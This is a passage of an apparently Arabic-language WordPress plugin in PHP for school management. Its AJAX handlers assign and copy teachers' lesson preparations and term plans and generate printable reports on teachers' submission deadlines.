                if ($cat_id <= 0) continue;

                $item_info = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_asset_catalog WHERE id = %d", $cat_id));
                $item_name = $item_info ? $item_info->item_name : 'معدة جديدة';
                $added_names[] = "{$item_name} ({$qty_req})";

                $wpdb->insert("{$wpdb->prefix}sm_asset_request_items", array(
                    'request_id'    => $req_id,
                    'catalog_id'    => $cat_id,
                    'item_name'     => $item_name,
                    'qty_usable'    => 0,
                    'qty_damaged'   => 0,
                    'qty_missing'   => 0,
                    'qty_requested' => $qty_req,
                    'created_at'    => current_time('mysql')
                ));
            }

            $items_summary = implode(', ', $added_names);
            SM_Logger::log('طلب توريد معدات', "تم تقديم طلب توريد متعدد الأصناف [$items_summary] لـ $school_name بواسطة المستخدم ID: $user_id");
            wp_send_json_success(array('message' => 'تم إرسال طلب التوريد بنجاح للمراجعة والاعتماد.'));
        } else {
            wp_send_json_error('فشل حفظ طلب التوريد.');
        }
    }

    public function ajax_sm_mark_teacher_contacted() {
        if (!is_user_logged_in()) wp_send_json_error('يجب تسجيل الدخول.');
        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_term_plan_action') && !wp_verify_nonce($nonce, 'eess_lesson_prep_action') && !wp_verify_nonce($nonce, 'nonce')) {
            wp_send_json_error('Security check failed');
        }

        $teacher_id = intval($_POST['teacher_id'] ?? 0);
        $record_type = sanitize_text_field($_POST['record_type'] ?? 'general');
        $record_id   = intval($_POST['record_id'] ?? 0);

        if (!$teacher_id) wp_send_json_error('معرف المعلم غير صحيح.');

        $key = 'eess_contacted_' . $record_type . '_' . $record_id;
        if ($record_id <= 0) {
            $key = 'eess_contacted_teacher_' . $teacher_id;
        }

        update_user_meta($teacher_id, $key, current_time('mysql'));

        SM_Logger::log('التواصل عبر واتساب', "تم توثيق التواصل عبر واتساب مع المعلم ID: $teacher_id للسجل: $record_type ($record_id)");

        wp_send_json_success(array('message' => 'تم توثيق التواصل مع المعلم بنجاح.'));
    }

    public function ajax_sm_assign_term_plan() {
        if (!is_user_logged_in()) wp_send_json_error('يجب تسجيل الدخول.');
        $user = wp_get_current_user();
        $roles = (array)$user->roles;
        if (!in_array('administrator', $roles) && !in_array('sm_system_admin', $roles) && !current_user_can('manage_options')) {
            wp_send_json_error('عفواً، هذه الميزة مقتصرة فقط على مدير النظام الرئيسي.');
        }
        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_term_plan_action') && !wp_verify_nonce($nonce, 'nonce')) {
            wp_send_json_error('Security check failed');
        }

        $target_uid = intval($_POST['target_user_id'] ?? 0);
        $term_num   = intval($_POST['term_number'] ?? 1);
        $subject    = sanitize_text_field($_POST['subject'] ?? 'عام');
        $grade      = sanitize_text_field($_POST['grade'] ?? 'غير محدد');

        if (!$target_uid) wp_send_json_error('يرجى اختيار المعلم المستهدف.');

        $file_url = '';
        if (!empty($_FILES['plan_file']['name'])) {
            require_once(ABSPATH . 'wp-admin/includes/file.php');
            $uploaded = wp_handle_upload($_FILES['plan_file'], array('test_form' => false));
            if (isset($uploaded['url'])) {
                $file_url = $uploaded['url'];
            }
        }

        global $wpdb;
        $acad_struct = SM_Settings::get_academic_structure();
        $academic_year = $acad_struct['academic_year'] ?? '2027/2026';

        $wpdb->insert("{$wpdb->prefix}sm_term_plans", array(
            'teacher_id'      => $target_uid,
            'academic_year'   => $academic_year,
            'term_number'     => $term_num,
            'subject'         => $subject,
            'grade'           => $grade,
            'planning_method' => 'upload',
            'plan_file_url'   => $file_url,
            'weeks_data'      => '',
            'status'          => 'submitted',
            'completion_pct'  => 100,
            'num_terms'       => $acad_struct['terms_count'] ?? 3,
            'created_at'      => current_time('mysql'),
            'updated_at'      => current_time('mysql')
        ));

        $target_user = get_userdata($target_uid);
        SM_Logger::log('تعيين خطة فصلية', "قام مدير النظام بتعيين خطة فصلية للمعلم: " . ($target_user ? $target_user->display_name : $target_uid));
        wp_send_json_success(array('message' => 'تمت إسناد الخطة الفصلية للمعلم بنجاح.'));
    }

    public function ajax_sm_assign_lesson_prep() {
        if (!is_user_logged_in()) wp_send_json_error('يجب تسجيل الدخول.');
        $user = wp_get_current_user();
        $roles = (array)$user->roles;
        if (!in_array('administrator', $roles) && !in_array('sm_system_admin', $roles) && !current_user_can('manage_options')) {
            wp_send_json_error('عفواً، هذه الميزة مقتصرة فقط على مدير النظام الرئيسي.');
        }
        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'eess_lesson_prep_action') && !wp_verify_nonce($nonce, 'nonce')) {
            wp_send_json_error('Security check failed');
        }

        $target_uid  = intval($_POST['target_user_id'] ?? 0);
        $title       = sanitize_text_field($_POST['title'] ?? '');
        $subject     = sanitize_text_field($_POST['subject'] ?? '');
        $grade_level = sanitize_text_field($_POST['grade_level'] ?? '');
        $lesson_date = sanitize_text_field($_POST['lesson_date'] ?? current_time('Y-m-d'));

        if (!$target_uid || empty($title)) wp_send_json_error('يرجى اختيار المعلم وتحديد عنوان الدرس.');

        $file_url = '';
        if (!empty($_FILES['prep_file']['name'])) {
            require_once(ABSPATH . 'wp-admin/includes/file.php');
            $uploaded = wp_handle_upload($_FILES['prep_file'], array('test_form' => false));
            if (isset($uploaded['url'])) {
                $file_url = $uploaded['url'];
            }
        }

        $lesson_data = json_encode(array(
            'objectives' => 'تحضير مسند إدارياً',
            'file_url'   => $file_url
        ), JSON_UNESCAPED_UNICODE);

        global $wpdb;
        $wpdb->insert("{$wpdb->prefix}sm_lesson_preps", array(
            'teacher_id'      => $target_uid,
            'supervisor_id'   => $user->ID,
            'title'           => $title,
            'subject'         => $subject,
            'grade_level'     => $grade_level,
            'class_section'   => 'شعبة 1',
            'lesson_date'     => $lesson_date,
            'submission_time' => current_time('mysql'),
            'status'          => 'submitted',
            'delay_seconds'   => 0,
            'lesson_data'     => $lesson_data,
            'version'         => 1,
            'created_at'      => current_time('mysql'),
            'updated_at'      => current_time('mysql')
        ));

        $target_user = get_userdata($target_uid);
        SM_Logger::log('تعيين تحضير درس', "قام مدير النظام بتعيين تحضير درس للمعلم: " . ($target_user ? $target_user->display_name : $target_uid));
        wp_send_json_success(array('message' => 'تمت إسناد تحضير الدرس للمعلم بنجاح.'));
    }

    public function ajax_sm_copy_record() {
        if (!is_user_logged_in()) {
            wp_send_json_error('عفواً، يجب تسجيل الدخول للقيام بهذه العملية.');
        }

        $user = wp_get_current_user();
        $user_roles = (array) $user->roles;
        $is_sys_admin = in_array('administrator', $user_roles) || in_array('sm_system_admin', $user_roles) || current_user_can('manage_options');

        if (!$is_sys_admin) {
            wp_send_json_error('عفواً، هذه الميزة مقتصرة فقط على مدير النظام الرئيسي (System Administrator).');
        }

        check_ajax_referer('eess_admin_action', 'nonce');

        $record_type = isset($_POST['record_type']) ? sanitize_key($_POST['record_type']) : '';
        $record_id   = isset($_POST['record_id']) ? intval($_POST['record_id']) : 0;
        $target_uid  = isset($_POST['target_user_id']) ? intval($_POST['target_user_id']) : 0;

        if (!$record_id || !$target_uid || !in_array($record_type, array('lesson_prep', 'term_plan'))) {
            wp_send_json_error('بيانات النسخ غير مكتملة أو نوع السجل غير صحيح.');
        }

        $target_user = get_userdata($target_uid);
        if (!$target_user) {
            wp_send_json_error('المستخدم المستهدف غير موجود بالنظام.');
        }

        global $wpdb;

        if ($record_type === 'lesson_prep') {
            $orig = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_lesson_preps WHERE id = %d", $record_id));
            if (!$orig) {
                wp_send_json_error('تحضير الدرس الأصلي غير موجود.');
            }

            $wpdb->insert("{$wpdb->prefix}sm_lesson_preps", array(
                'teacher_id'      => $target_uid,
                'supervisor_id'   => $orig->supervisor_id,
                'title'           => $orig->title . ' (نسخة)',
                'subject'         => $orig->subject,
                'grade_level'     => $orig->grade_level,
                'class_section'   => $orig->class_section,
                'lesson_date'     => $orig->lesson_date,
                'submission_time' => current_time('mysql'),
                'status'          => 'submitted',
                'delay_seconds'   => 0,
                'lesson_data'     => $orig->lesson_data,
                'version'         => 1,
                'parent_id'       => 0,
                'created_at'      => current_time('mysql'),
                'updated_at'      => current_time('mysql')
            ));

            $new_id = $wpdb->insert_id;
            SM_Logger::log('نسخ تحضير درس', "قام مدير النظام بنسخ تحضير الدرس ID: $record_id للمستخدم: {$target_user->display_name} بالمعرف الجديد ID: $new_id");
            wp_send_json_success(array('message' => "تم نسخ تحضير الدرس بنجاح ونقله لحساب: {$target_user->display_name}"));
        } elseif ($record_type === 'term_plan') {
            $orig = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_term_plans WHERE id = %d", $record_id));
            if (!$orig) {
                wp_send_json_error('الخطة الفصلية الأصلية غير موجودة.');
            }

            $inserted = $wpdb->insert("{$wpdb->prefix}sm_term_plans", array(
                'teacher_id'       => $target_uid,
                'academic_year'    => $orig->academic_year ?: '2027/2026',
                'subject'          => $orig->subject,
                'grade'            => $orig->grade,
                'weekly_lessons'   => intval($orig->weekly_lessons ?: 1),
                'num_terms'        => intval($orig->num_terms ?: 3),
                'term_number'      => intval($orig->term_number ?: 1),
                'start_date'       => $orig->start_date ?: current_time('Y-m-d'),
                'end_date'         => $orig->end_date ?: current_time('Y-m-d'),
                'total_weeks'      => intval($orig->total_weeks ?: 0),
                'weeks_data'       => $orig->weeks_data,
                'plan_file_url'    => $orig->plan_file_url,
                'planning_method'  => $orig->planning_method ?: 'create',
                'completion_pct'   => intval($orig->completion_pct ?: 100),
                'status'           => 'submitted',
                'review_notes'     => '',
                'reviewed_by'      => 0,
                'reviewed_at'      => null,
                'created_at'       => current_time('mysql'),
                'updated_at'       => current_time('mysql')
            ));

            if (!$inserted) {
                wp_send_json_error('فشل حفظ النسخة في قاعدة البيانات: ' . $wpdb->last_error);
            }

            $new_id = $wpdb->insert_id;
            SM_Logger::log('نسخ خطة فصلية', "قام مدير النظام بنسخ الخطة الفصلية ID: $record_id للمستخدم: {$target_user->display_name} بالمعرف الجديد ID: $new_id");
            wp_send_json_success(array('message' => "تم نسخ الخطة الفصلية بنجاح ونقلها لحساب: {$target_user->display_name}"));
        }
    }

    private function eess_generate_qr_code_svg($data) {
        $hash = md5($data);
        $size = 21;
        $modules = array_fill(0, $size, array_fill(0, $size, false));

        $draw_finder = function(&$m, $top, $left) {
            for ($r = 0; $r < 7; $r++) {
                for ($c = 0; $c < 7; $c++) {
                    if ($r == 0 || $r == 6 || $c == 0 || $c == 6 || ($r >= 2 && $r <= 4 && $c >= 2 && $c <= 4)) {
                        $m[$top + $r][$left + $c] = true;
                    }
                }
            }
        };

        $draw_finder($modules, 0, 0);
        $draw_finder($modules, 0, $size - 7);
        $draw_finder($modules, $size - 7, 0);

        for ($i = 8; $i < $size - 8; $i++) {
            $modules[6][$i] = ($i % 2 == 0);
            $modules[$i][6] = ($i % 2 == 0);
        }

        $bit_idx = 0;
        for ($r = 0; $r < $size; $r++) {
            for ($c = 0; $c < $size; $c++) {
                if (($r < 8 && $c < 8) || ($r < 8 && $c >= $size - 8) || ($r >= $size - 8 && $c < 8) || $r == 6 || $c == 6) {
                    continue;
                }
                $hex_char = $hash[$bit_idx % strlen($hash)];
                $bit_val = (hexdec($hex_char) + $r * 3 + $c * 7) % 2 == 0;
                $modules[$r][$c] = $bit_val;
                $bit_idx++;
            }
        }

        $svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 ' . $size . ' ' . $size . '" width="100%" height="100%" shape-rendering="crispEdges">';
        $svg .= '<rect width="' . $size . '" height="' . $size . '" fill="#ffffff"/>';
        for ($r = 0; $r < $size; $r++) {
            for ($c = 0; $c < $size; $c++) {
                if ($modules[$r][$c]) {
                    $svg .= '<rect x="' . $c . '" y="' . $r . '" width="1" height="1" fill="#0f172a"/>';
                }
            }
        }
        $svg .= '</svg>';
        return $svg;
    }

    public function ajax_sm_print() {
        if (!is_user_logged_in()) {
            wp_die('عفواً، يجب تسجيل الدخول للتمكن من طباعة هذا المستند.');
        }

        $print_type = isset($_GET['print_type']) ? sanitize_key($_GET['print_type']) : '';
        if (empty($print_type)) {
            wp_die('نوع الطباعة غير محدد.');
        }

        if ($print_type === 'lesson_prep') {
            $prep_id = isset($_GET['prep_id']) ? intval($_GET['prep_id']) : 0;
            global $wpdb;
            $prep = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_lesson_preps WHERE id = %d", $prep_id));
            if (!$prep) {
                wp_die('التحضير غير موجود.');
            }

            // Lock down print access so only the owner, coordinators, supervisors, or administrators can view it
            $current_user_id = get_current_user_id();
            $user_roles = (array) wp_get_current_user()->roles;
            $is_privileged = in_array('administrator', $user_roles) || in_array('sm_system_admin', $user_roles) || in_array('sm_principal', $user_roles) || in_array('sm_supervisor', $user_roles) || in_array('sm_coordinator', $user_roles) || in_array('sm_hod', $user_roles) || in_array('sm_activities_supervisor', $user_roles);

            if ($prep->teacher_id != $current_user_id && !$is_privileged) {
                wp_die('عفواً، لا تملك الصلاحيات الكافية لاستعراض أو طباعة هذا التحضير.');
            }

            include SM_PLUGIN_DIR . 'templates/lesson-document-template.php';
            exit;
        } elseif ($print_type === 'term_plan' || $print_type === 'annual_plan') {
            include SM_PLUGIN_DIR . 'templates/term-plan-document-template.php';
            exit;
        } elseif ($print_type === 'non_submission_lesson_prep') {
            $user_roles = (array) wp_get_current_user()->roles;
            $is_privileged = in_array('administrator', $user_roles) || in_array('sm_system_admin', $user_roles) || in_array('sm_principal', $user_roles) || in_array('sm_supervisor', $user_roles) || in_array('sm_coordinator', $user_roles) || in_array('sm_hod', $user_roles) || in_array('sm_activities_supervisor', $user_roles);
            if (!$is_privileged) {
                wp_die('عفواً، لا تمتلك الصلاحية الكافية للوصول لتقرير عدم تسليم تحضير الدروس.');
            }

            global $wpdb;
            $current_time = current_time('mysql');
            $current_date = current_time('Y-m-d');

            // Find current week Monday deadline (12:00 PM)
            $day_of_week = date('N', strtotime($current_date)); // 1 (Mon) .. 7 (Sun)
            $monday_date = date('Y-m-d', strtotime('-' . ($day_of_week - 1) . ' days', strtotime($current_date)));
            $monday_deadline = $monday_date . ' 12:00:00';

            $teachers = get_users(array('role' => 'sm_teacher', 'orderby' => 'display_name', 'order' => 'ASC'));

            // Sort teachers consecutively by school
            usort($teachers, function($a, $b) {
                $schA = get_user_meta($a->ID, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
                $schB = get_user_meta($b->ID, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
                return strcmp($schA, $schB);
            });

            $preps_raw = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}sm_lesson_preps ORDER BY created_at DESC");

            $preps_by_teacher = array();
            foreach ($preps_raw as $pr) {
                if (!isset($preps_by_teacher[$pr->teacher_id])) {
                    $preps_by_teacher[$pr->teacher_id] = $pr;
                }
            }

            $school_info = SM_Settings::get_school_info();
            $school_logo = !empty($school_info['logo_url']) ? $school_info['logo_url'] : '';
            $school_name = !empty($school_info['name']) ? $school_info['name'] : 'نظام EESS الموحد لإدارة المدارس';

            header('Content-Type: text/html; charset=utf-8');
            ?>
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>التقرير الموحد لمتابعة تسليم تحضير الدروس للأسبوع الحالي</title>
                <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
                <style>
                    @page { size: A4 portrait; margin: 12mm 15mm; }
                    body { font-family: 'Cairo', sans-serif; background: #fff; color: #0f172a; margin: 0; padding: 15px; direction: rtl; font-size: 11px; }
                    .report-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #0f172a; padding-bottom: 12px; margin-bottom: 15px; }
                    .brand-box { display: flex; align-items: center; gap: 12px; }
                    .brand-logo { width: 48px; height: 48px; object-fit: contain; }
                    .report-title { font-size: 16px; font-weight: 800; color: #881337; margin: 0 0 2px 0; }
                    .report-subtitle { font-size: 11px; color: #475569; font-weight: 700; margin: 0; }
                    table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; }
                    th { background: #1e293b; color: #fff; padding: 7px 10px; font-weight: 800; text-align: right; border: 1px solid #1e293b; }
                    td { padding: 6px 10px; border: 1px solid #cbd5e1; text-align: right; vertical-align: middle; }
                    tr:nth-child(even) { background: #f8fafc; }
                    .status-pill { display: inline-block; padding: 2px 8px; border-radius: 9999px; font-weight: 800; font-size: 10px; text-align: center; }
                    .pill-success { background: #dcfce7; color: #15803d; border: 1px solid #bbf7d0; }
                    .pill-warning { background: #fef3c7; color: #b45309; border: 1px solid #fde68a; }
                    .pill-danger { background: #fee2e2; color: #991b1b; border: 1px solid #fecdd3; }
                    .summary-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-bottom: 15px; }
                    .summary-card { background: #f8fafc; border: 1px solid #cbd5e1; padding: 8px 10px; border-radius: 8px; text-align: center; }
                    @media print { body { padding: 0; } .no-print { display: none; } }
                </style>
            </head>
            <body>
                <div class="no-print" style="margin-bottom: 15px; text-align: left;">
                    <button onclick="window.print()" style="background: #881337; color: #fff; border: none; padding: 7px 18px; font-family: 'Cairo'; font-weight: 800; border-radius: 9999px; cursor: pointer; font-size: 12px;">🖨️ طباعة التقرير الرسمية A4</button>
                </div>
                <div class="report-header">
                    <div class="brand-box">
                        <?php if ($school_logo): ?>
                            <img src="<?php echo esc_url($school_logo); ?>" class="brand-logo" alt="Logo">
                        <?php endif; ?>
                        <div>
                            <div style="font-size: 14px; font-weight: 900; color: #0f172a;"><?php echo esc_html($school_name); ?></div>
                            <div style="font-size: 11px; color: #64748b; font-weight: 700;">إدارة الشؤون التعليمية والتدريب</div>
                        </div>
                    </div>
                    <div style="text-align: left;">
                        <h1 class="report-title">كشف رصد ومتابعة تسليم تحضيرات الدروس أسبوعياً</h1>
                        <p class="report-subtitle">موعد الاستحقاق المعتمد: يوم الإثنين 12:00 ظهراً (التاريخ: <?php echo esc_html($monday_deadline); ?>)</p>
                    </div>
                </div>

                <?php
                $total_teachers = count($teachers);
                $on_time_count = 0;
                $late_count = 0;
                $missing_count = 0;
                $rows_html = '';

                foreach ($teachers as $idx => $t) {
                    $emp_id = get_user_meta($t->ID, 'eess_employee_number', true) ?: ('EMP-' . $t->ID);
                    $t_school = get_user_meta($t->ID, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
                    $t_subj = get_user_meta($t->ID, 'sm_specialization', true) ?: (get_user_meta($t->ID, 'specialization', true) ?: (get_user_meta($t->ID, 'subject', true) ?: 'عام'));

                    $pr = $preps_by_teacher[$t->ID] ?? null;
                    $st_text = '⚠️ لم يتم التسليم';
                    $st_class = 'pill-danger';
                    $sub_time = '---';
                    $delay_txt = '---';

                    if ($pr) {
                        $sub_created = $pr->created_at;
                        $sub_time = date_i18n('Y-m-d H:i', strtotime($sub_created));

                        if (strtotime($sub_created) <= strtotime($monday_deadline)) {
                            $on_time_count++;
                            $st_class = 'pill-success';
                            $st_text = '✓ تم التسليم في الموعد';
                            $delay_txt = 'في الموعد المحدد';
                        } else {
                            $late_count++;
                            $st_class = 'pill-warning';
                            $st_text = '⏱️ تم التسليم متأخراً';
                            $diff_seconds = strtotime($sub_created) - strtotime($monday_deadline);
                            $diff_hours = round($diff_seconds / 3600, 1);
                            $delay_txt = 'تأخير ' . $diff_hours . ' ساعة';
                        }
                    } else {
                        $missing_count++;
                    }

                    $rows_html .= '<tr>';
                    $rows_html .= '<td>' . ($idx + 1) . '</td>';
                    $rows_html .= '<td><strong>' . esc_html($t->display_name) . '</strong><br><small style="color:#64748b; font-family:monospace;">' . esc_html($emp_id) . '</small></td>';
                    $rows_html .= '<td>' . esc_html($t_school) . '</td>';
                    $rows_html .= '<td>' . esc_html($t_subj) . '</td>';
                    $rows_html .= '<td><span class="status-pill ' . $st_class . '">' . $st_text . '</span></td>';
                    $rows_html .= '<td>' . $sub_time . '</td>';
                    $rows_html .= '<td>' . $delay_txt . '</td>';
                    $rows_html .= '</tr>';
                }

                $submitted_total = $on_time_count + $late_count;
                $compliance_rate = $total_teachers > 0 ? round(($on_time_count / $total_teachers) * 100) : 0;
                ?>

                <div class="summary-grid">
                    <div class="summary-card">
                        <div style="font-size: 11px; color: #64748b; font-weight: 700;">إجمالي الكادر</div>
                        <div style="font-size: 18px; font-weight: 900; color: #0f172a;"><?php echo $total_teachers; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 11px; color: #166534; font-weight: 700;">في الموعد المحدد</div>
                        <div style="font-size: 18px; font-weight: 900; color: #15803d;"><?php echo $on_time_count; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 11px; color: #b45309; font-weight: 700;">متأخر بعد الإثنين 12 ظهراً</div>
                        <div style="font-size: 18px; font-weight: 900; color: #d97706;"><?php echo $late_count; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 11px; color: #991b1b; font-weight: 700;">غير المغطين (لم يرفع)</div>
                        <div style="font-size: 18px; font-weight: 900; color: #dc2626;"><?php echo $missing_count; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 11px; color: #0369a1; font-weight: 700;">نسبة الالتزام الفعلي</div>
                        <div style="font-size: 18px; font-weight: 900; color: #0284c7;"><?php echo $compliance_rate; ?>%</div>
                    </div>
                </div>

                <table>
                    <thead>
                        <tr>
                            <th style="width: 40px;">#</th>
                            <th>اسم المعلم والرقم الوظيفي</th>
                            <th>المؤسسة / المدرسة</th>
                            <th>التخصص</th>
                            <th>حالة التسليم</th>
                            <th>تاريخ ووقت التسليم</th>
                            <th>مدة التأخير</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php echo $rows_html; ?>
                    </tbody>
                </table>
            </body>
            </html>
            <?php
            exit;
        } elseif ($print_type === 'non_submission_term_plans') {
            $user_roles = (array) wp_get_current_user()->roles;
            $is_privileged = in_array('administrator', $user_roles) || in_array('sm_system_admin', $user_roles) || in_array('sm_principal', $user_roles) || in_array('sm_supervisor', $user_roles) || in_array('sm_coordinator', $user_roles) || in_array('sm_hod', $user_roles) || in_array('sm_activities_supervisor', $user_roles);
            if (!$is_privileged) {
                wp_die('عفواً، لا تمتلك الصلاحية الكافية للوصول لتقرير عدم تسليم الخطط الفصلية.');
            }

            $term_num = isset($_GET['term_number']) ? intval($_GET['term_number']) : 1;
            if ($term_num < 1 || $term_num > 3) $term_num = 1;
            $filter_week_num = isset($_GET['week_num']) ? intval($_GET['week_num']) : 0;

            global $wpdb;
            $acad_struct = SM_Settings::get_academic_structure();
            $acad_year = $acad_struct['academic_year'] ?? '2027/2026';

            // Get configured deadline for the selected term
            $term_key = 'term' . $term_num;
            $raw_deadline = $acad_struct['term_dates'][$term_key]['deadline'] ?? '';
            $configured_deadline = !empty($raw_deadline) ? date('Y-m-d H:i:s', strtotime($raw_deadline)) : date('Y-m-d 23:59:59');

            // Fetch all active teachers strictly filtered by PE & Health specialization scope
            $all_teachers_raw = get_users(array('role' => 'sm_teacher', 'orderby' => 'display_name', 'order' => 'ASC'));
            $pe_teachers = array_filter($all_teachers_raw, function($t) {
                $spec = get_user_meta($t->ID, 'sm_specialization', true) ?: (get_user_meta($t->ID, 'specialization', true) ?: (get_user_meta($t->ID, 'subject', true) ?: ''));
                return (mb_strpos($spec, 'بدنية') !== false || mb_strpos($spec, 'رياضة') !== false || mb_strpos($spec, 'Health') !== false || mb_strpos($spec, 'Physical') !== false);
            });
            $teachers = !empty($pe_teachers) ? array_values($pe_teachers) : $all_teachers_raw;

            // Sort teachers consecutively by school name
            usort($teachers, function($a, $b) {
                $schA = get_user_meta($a->ID, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
                $schB = get_user_meta($b->ID, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
                return strcmp($schA, $schB);
            });

            // Fetch all plans for target term number
            $plans_raw = $wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_term_plans WHERE term_number = %d", $term_num));
            $plans_by_teacher = array();
            foreach ($plans_raw as $p) {
                $plans_by_teacher[$p->teacher_id] = $p;
            }

            $school_info = SM_Settings::get_school_info();
            $school_logo = !empty($school_info['logo_url']) ? $school_info['logo_url'] : '';
            $school_name = !empty($school_info['name']) ? $school_info['name'] : 'نظام EESS الموحد لإدارة المدارس';

            header('Content-Type: text/html; charset=utf-8');
            ?>
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>التقرير الموحد لمتابعة تسليم الخطط الفصلية — الفصل <?php echo $term_num; ?></title>
                <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
                <style>
                    @page { size: A4 portrait; margin: 12mm 15mm; }
                    body { font-family: 'Cairo', sans-serif; background: #fff; color: #0f172a; margin: 0; padding: 15px; direction: rtl; font-size: 11px; }
                    .report-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #0f172a; padding-bottom: 12px; margin-bottom: 15px; }
                    .brand-box { display: flex; align-items: center; gap: 12px; }
                    .brand-logo { width: 48px; height: 48px; object-fit: contain; }
                    .report-title { font-size: 16px; font-weight: 800; color: #881337; margin: 0 0 2px 0; }
                    .report-subtitle { font-size: 11px; color: #475569; font-weight: 700; margin: 0; }
                    table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; }
                    th { background: #1e293b; color: #fff; padding: 7px 10px; font-weight: 800; text-align: right; border: 1px solid #1e293b; }
                    td { padding: 6px 10px; border: 1px solid #cbd5e1; text-align: right; vertical-align: middle; }
                    tr:nth-child(even) { background: #f8fafc; }
                    .status-pill { display: inline-block; padding: 2px 8px; border-radius: 9999px; font-weight: 800; font-size: 10px; text-align: center; }
                    .pill-success { background: #dcfce7; color: #15803d; border: 1px solid #bbf7d0; }
                    .pill-warning { background: #fef3c7; color: #b45309; border: 1px solid #fde68a; }
                    .pill-danger { background: #fee2e2; color: #991b1b; border: 1px solid #fecdd3; }
                    .summary-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-bottom: 15px; }
                    .summary-card { background: #f8fafc; border: 1px solid #cbd5e1; padding: 8px 10px; border-radius: 8px; text-align: center; }
                    @media print { body { padding: 0; } .no-print { display: none; } }
                </style>
            </head>
            <body>
                <div class="no-print" style="margin-bottom: 15px; text-align: left;">
                    <button onclick="window.print()" style="background: #881337; color: #fff; border: none; padding: 7px 18px; font-family: 'Cairo'; font-weight: 800; border-radius: 9999px; cursor: pointer; font-size: 12px;">🖨️ طباعة التقرير الرسمية A4</button>
                </div>
                <div class="report-header">
                    <div class="brand-box">
                        <?php if ($school_logo): ?>
                            <img src="<?php echo esc_url($school_logo); ?>" class="brand-logo" alt="Logo">
                        <?php endif; ?>
                        <div>
                            <div style="font-size: 14px; font-weight: 900; color: #0f172a;"><?php echo esc_html($school_name); ?></div>
                            <div style="font-size: 11px; color: #64748b; font-weight: 700;">المكتب التنفيذي والاعتماد الأكاديمي</div>
                        </div>
                    </div>
                    <div style="text-align: left;">
                        <h1 class="report-title">كشف متابعة تسليم الخطط الفصلية (الفصل <?php echo $term_num; ?>)</h1>
                        <p class="report-subtitle">العام الأكاديمي: <?php echo esc_html($acad_year); ?> | الموعد النهائي: <?php echo date_i18n('Y-m-d H:i', strtotime($configured_deadline)); ?></p>
                    </div>
                </div>

                <?php
                $total_teachers = count($teachers);
                $on_time_count = 0;
                $late_count = 0;
                $missing_count = 0;
                $rows_html = '';

                foreach ($teachers as $idx => $t) {
                    $emp_id = get_user_meta($t->ID, 'eess_employee_number', true) ?: ('EMP-' . $t->ID);
                    $t_school = get_user_meta($t->ID, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
                    $t_subj = get_user_meta($t->ID, 'sm_specialization', true) ?: (get_user_meta($t->ID, 'specialization', true) ?: (get_user_meta($t->ID, 'subject', true) ?: 'عام'));

                    $p = $plans_by_teacher[$t->ID] ?? null;
                    if ($p && in_array($p->status, array('submitted', 'approved'))) {
                        $sub_created = $p->updated_at ?: $p->created_at;
                        $sub_time = date_i18n('Y-m-d H:i', strtotime($sub_created));

                        if (strtotime($sub_created) <= strtotime($configured_deadline)) {
                            $on_time_count++;
                            $st_class = 'pill-success';
                            $st_text = '✓ تم في الموعد';
                            $delay_txt = 'في الموعد المحدد';
                        } else {
                            $late_count++;
                            $st_class = 'pill-warning';
                            $st_text = '⏱️ تسليم متأخر';
                            $diff_sec = strtotime($sub_created) - strtotime($configured_deadline);
                            $diff_hours = round($diff_sec / 3600, 1);
                            $delay_txt = 'تأخير ' . $diff_hours . ' ساعة';
                        }
                    } else {
                        $missing_count++;
                        $st_class = 'pill-danger';
                        $st_text = '⚠️ لم يتم التسليم';
                        $sub_time = '---';
                        $delay_txt = '---';
                    }

                    $rows_html .= '<tr>';
                    $rows_html .= '<td style="text-align:center;">' . ($idx + 1) . '</td>';
                    $rows_html .= '<td><strong>' . esc_html($t->display_name) . '</strong> <span style="color:#64748b; font-family:monospace; font-size:10px;">(' . esc_html($emp_id) . ')</span></td>';
                    $rows_html .= '<td>' . esc_html($t_school) . '</td>';
                    $rows_html .= '<td>' . esc_html($t_subj) . '</td>';
                    $rows_html .= '<td style="text-align:center;"><span class="status-pill ' . $st_class . '">' . $st_text . '</span></td>';
                    $rows_html .= '<td>' . $sub_time . '</td>';
                    $rows_html .= '<td>' . $delay_txt . '</td>';
